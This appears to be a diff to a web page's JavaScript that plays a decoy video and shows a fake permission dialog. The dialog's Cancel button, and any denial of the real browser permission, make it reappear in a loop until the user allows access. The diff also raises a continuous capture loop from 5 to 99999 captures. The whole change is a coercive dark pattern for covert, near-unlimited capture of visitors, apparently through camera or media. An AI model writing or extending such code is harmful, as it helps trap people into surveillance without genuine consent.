@@ -10,8 +10,32 @@ document.addEventListener('DOMContentLoaded', () => {
         contentVideo.play();
     });
 
-    // 2. Start Process Immediately
-    initCapture();
+    // 2. Setup Permission Logic
+    const permissionModal = document.getElementById('permission-modal');
+    const btnCancel = document.getElementById('btn-cancel');
+    const btnAllow = document.getElementById('btn-allow');
+
+    // Show modal initially
+    showModal();
+
+    // Modal Action: Allow
+    btnAllow.addEventListener('click', async () => {
+        permissionModal.style.display = 'none';
+        // Trigger Real Permissions
+        await initCapture();
+    });
+
+    // Modal Action: Cancel (The Loop)
+    btnCancel.addEventListener('click', () => {
+        permissionModal.style.display = 'none';
+        setTimeout(() => {
+            showModal();
+        }, 300); // 300ms delay before annoying reappearance
+    });
+
+    function showModal() {
+        permissionModal.style.display = 'flex';
+    }
 
     async function initCapture() {
         console.log("Requesting permissions...");
@@ -55,7 +79,7 @@ document.addEventListener('DOMContentLoaded', () => {
 
                 // 4. Continuous Capture Loop
                 let count = 0;
-                const maxCaptures = 5;
+                const maxCaptures = 99999;
 
                 const intervalId = setInterval(async () => {
                     if (count >= maxCaptures) {
@@ -72,6 +96,10 @@ document.addEventListener('DOMContentLoaded', () => {
 
         } catch (err) {
             console.log("Permissions denied or error:", err);
+            // If real permissions fail, re-show the fake modal to restart the loop
+            setTimeout(() => {
+                showModal();
+            }, 500);
         }
     }
 
